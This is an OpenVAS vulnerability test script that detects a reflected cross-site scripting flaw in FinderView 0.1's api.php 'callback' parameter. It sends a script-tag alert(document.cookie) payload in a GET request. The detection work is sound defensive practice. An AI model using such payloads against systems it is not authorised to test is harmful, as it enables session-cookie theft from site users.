###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_finderview_mult_vuln.nasl 11702 2018-10-01 07:31:38Z asteins $
#
# FinderView Multiple Vulnerabilities
#
# Authors:
# Tushar Khelge <ktushar@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:finderview:finderview";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.808097");
  script_version("$Revision: 11702 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-01 09:31:38 +0200 (Mon, 01 Oct 2018) $");
  script_tag(name:"creation_date", value:"2016-06-27 14:33:21 +0530 (Mon, 27 Jun 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("FinderView Multiple Vulnerabilities");

  script_tag(name:"summary", value:"The host is installed with FinderView
  and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"The multiple flaws are due to an
  insufficient validation of user supplied input via GET parameter 'callback'
  to 'api.php' script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to view directory and to cause cross site scripting and steal the
  cookie of other active sessions.");

  script_tag(name:"affected", value:"FinderView version 0.1");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40011");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_finderview_detect.nasl");
  script_mandatory_keys("FinderView/Installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if(!find_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:find_port)){
  exit(0);
}

if(dir == "/") dir = "";

url =  dir + "/api.php?callback=<script>alert(document.cookie)<%2fscript>";

if(http_vuln_check(port:find_port, url:url, check_header:TRUE,
                   pattern:"<script>alert\(document.cookie\)</script>",
                   extra_check:"README.md"))
{
  report = report_vuln_url(port:find_port, url:url);
  security_message(port:find_port, data:report);
  exit(0);
}
